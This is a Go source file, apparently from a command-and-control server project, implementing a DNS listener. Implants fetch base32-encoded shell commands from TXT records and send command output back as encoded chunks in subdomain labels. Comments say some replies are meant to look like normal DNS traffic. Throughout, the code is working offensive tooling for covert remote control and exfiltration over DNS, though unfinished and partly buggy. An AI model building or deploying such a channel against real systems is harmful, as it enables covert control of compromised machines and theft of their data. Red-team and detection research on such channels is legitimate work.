package listener

import (
	"asritha.dev/c2server/pkg/model"
	"encoding/base32"
	"fmt"
	"github.com/miekg/dns"
	"gorm.io/gorm"
	"log"
	"os"
	"strconv"
	"strings"
	"sync"
)

// TODO: make these functions simpler ?

/*
	- command format: `<implant-id>.cmd.cloud-docker.net`
	- sending results format: `implantID.taskID.chunkCount.chunkIndex.chunkData.res.<domain>`
*/

type DNSListener struct {
	db   *gorm.DB
	fqdn string // TODO: can replace in other places where its calling dns.Fqdn again?
}

func NewDNS(db *gorm.DB, domain string) *DNSListener {
	return &DNSListener{db: db, fqdn: dns.Fqdn(domain)}
}

// TODO: look at partialResult logic, does it make sense?
// partialResult holds incoming chunks until all are received
type partialResult struct {
	chunksReceived int
	chunks         []string // chunkIndex -> data
}

// DNSHandler handles both ".c." (for commands) and ".r." (for results) in one place
type DNSHandler struct {
	db          *gorm.DB
	b32Encoding *base32.Encoding // Base32 no-padding encoder/decoder scheme
	mu          sync.Mutex
	pending     map[uint]map[uint]*partialResult // pending results: implantID -> taskID -> partialResult
	fqdn        string                           // replcae in the rplaces whern eclaling dns.Fqdn
}

func NewDNSHandler(db *gorm.DB, fqdn string) *DNSHandler {
	return &DNSHandler{
		db:          db,
		b32Encoding: base32.StdEncoding.WithPadding(base32.NoPadding),
		pending:     make(map[uint]map[uint]*partialResult),
	}
}

func (h *DNSHandler) ServeDNS(w dns.ResponseWriter, req *dns.Msg) {
	q := req.Question[0]
	log.Printf("Raw Query %s\n", q.Name)
	labels := dns.SplitDomainName(strings.ToLower(q.Name)) // always lowercase for consistent parsing

	reply := new(dns.Msg)
	reply.SetReply(req)
	reply.Authoritative = true

	// guard against too‐short names
	if len(labels) < 2 {
		w.WriteMsg(reply) // empty reply
		return
	}

	// parse implant ID
	u64, err := strconv.ParseUint(labels[0], 10, 64)
	if err != nil {
		log.Printf("bad implant ID %q: %v", labels[0], err)
		w.WriteMsg(reply)
		return
	}
	implantID := uint(u64)

	switch {
	// ———————————————————————————————————————————
	// "<implantID>.c.<domain>” → serve TXT with b32-encoded “<taskID>:<full‑cmd>"
	case q.Qtype == dns.TypeTXT && labels[1] == "c":
		tasks, err := getPendingTasksForImplant(h.db, implantID)
		if err != nil {
			log.Printf("fetch tasks err: %v", err)
			break
		}

		if len(tasks) == 0 {
			break // reply stays empty
		}

		for _, task := range tasks {
			if task.TaskType != model.ShellCommand.String() {
				continue
			}

			commandWithArgs, ok := task.Options["commandWithArgs"].([]string)
			if !ok {
				continue
			}
			payload := fmt.Sprintf("%d:%s", task.ID, strings.Join(commandWithArgs, " "))
			enc := h.b32Encoding.EncodeToString([]byte(payload))
			reply.Answer = append(reply.Answer, makeTXT(q.Name, enc))
		}
	// ———————————————————————————————————————————
	// TODO: change this to be more efficient
	//  "<implantID>.<taskID>.<chunkCount>.<chunkIndex>.<chunkData>.r.cloud-docker.net"
	case q.Qtype == dns.TypeTXT && len(labels) >= 6 && labels[5] == "r":
		u64TaskID, err1 := strconv.ParseUint(labels[1], 10, 64)
		chunkCount, err2 := strconv.Atoi(labels[2])
		chunkIndex, err3 := strconv.Atoi(labels[3])
		chunkData := labels[4]

		if err1 != nil || err2 != nil || err3 != nil {
			log.Printf("Invalid result labels: %v, %v, %v", err1, err2, err3)
			break
		}
		decodedChunkData, err := h.b32Encoding.DecodeString(strings.ToUpper(chunkData))
		if err != nil {
			log.Printf("Error decoding chunk data: %v", err)
			break
		}

		taskID := uint(u64TaskID)
		// single-chunk -> store immediately
		if chunkCount == 1 {
			newResult := model.Result{
				Content: string(decodedChunkData),
				// TODO: should add Success  -> send as another subdomain field
				TaskID: taskID,
			}
			if err := storeNewResult(h.db, implantID, newResult); err != nil {
				log.Printf("Error storing single-chunk result: %v", err)
			}
			break
		}

		// multi-chunk -> buffer then assemble
		h.mu.Lock()
		if _, ok := h.pending[implantID]; !ok {
			h.pending[implantID] = make(map[uint]*partialResult)
		}
		pendingResult, exists := h.pending[implantID][taskID]
		if !exists {
			pendingResult = &partialResult{chunks: make([]string, chunkCount)}
			h.pending[implantID][taskID] = pendingResult
		}
		pendingResult.chunks[chunkIndex] = chunkData

		if chunkCount == pendingResult.chunksReceived {
			// assemble in-order
			fullResult := strings.Join(pendingResult.chunks, "")
			// cleanup buffer
			delete(h.pending[implantID], taskID)
			h.mu.Unlock()
			// store in DB
			newResult := model.Result{
				Content: fullResult,
				// TODO: should add Success  -> send as another subdomain field
				TaskID: taskID,
			}
			if err := storeNewResult(h.db, implantID, newResult); err != nil {
				log.Printf("Error storing full result: %v", err)
			}
		} else {
			h.mu.Unlock()
		}
	case q.Qtype == dns.TypeSOA:
		if q.Name == h.fqdn {
			reply.Answer = append(reply.Answer, &dns.SOA{
				Hdr:     dns.RR_Header{Name: h.fqdn, Rrtype: dns.TypeSOA, Class: dns.ClassINET, Ttl: 60},
				Ns:      "#TODO",
				Mbox:    "hostmaster." + h.fqdn,
				Serial:  20, // TODO: fix
				Refresh: 3600, Retry: 1800, Expire: 604800, Minttl: 60,
			})
		}

	// NS
	case q.Qtype == dns.TypeNS:
		if q.Name == h.fqdn {
			reply.Answer = append(reply.Answer,
				&dns.NS{Hdr: dns.RR_Header{Name: h.fqdn, Rrtype: dns.TypeNS, Class: dns.ClassINET, Ttl: 60}, Ns: "#TODO"},
				&dns.NS{Hdr: dns.RR_Header{Name: h.fqdn, Rrtype: dns.TypeNS, Class: dns.ClassINET, Ttl: 60}, Ns: "#TODO"},
			)
		}

	// A for your nameservers
	case q.Qtype == dns.TypeA:
		// TODO:
		//switch q.Name {
		//case ns1Name:
		//	m.Answer = append(m.Answer, &dns.A{
		//		Hdr: dns.RR_Header{Name: ns1Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 60},
		//		A:   net.ParseIP("<YOUR_STATIC_IP>"),
		//	})
		//case ns2Name:
		//	m.Answer = append(m.Answer, &dns.A{
		//		Hdr: dns.RR_Header{Name: ns2Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 60},
		//		A:   net.ParseIP("<YOUR_STATIC_IP>"),
		//	})
		//}
	}

	if len(reply.Answer) == 0 {
		// send a single empty TXT so it looks like a normal DNS TXT response
		reply.Answer = []dns.RR{emptyTXT(q.Name)}
	}

	if err := w.WriteMsg(reply); err != nil {
		log.Printf("WriteMsg error: %v", err)
	}
}

func (listener *DNSListener) Listen() {
	dnsBindAddr := os.Getenv("DNS_BIND_ADDR")
	server := &dns.Server{
		Addr:    dnsBindAddr,
		Net:     "udp",
		Handler: NewDNSHandler(listener.db, listener.fqdn)}
	log.Printf("Starting DNS server for zone %s on port 53")
	if err := server.ListenAndServe(); err != nil {
		log.Fatalf("server failed: %v", err)
	}
}

// helper for empty TXT
func emptyTXT(name string) dns.RR {
	return &dns.TXT{
		Hdr: dns.RR_Header{Name: dns.Fqdn(name), Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 5},
		Txt: []string{""},
	}
}

// helper to create TXT with data
func makeTXT(name, txt string) dns.RR {
	return &dns.TXT{
		Hdr: dns.RR_Header{Name: dns.Fqdn(name), Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 5},
		Txt: []string{txt},
	}
}
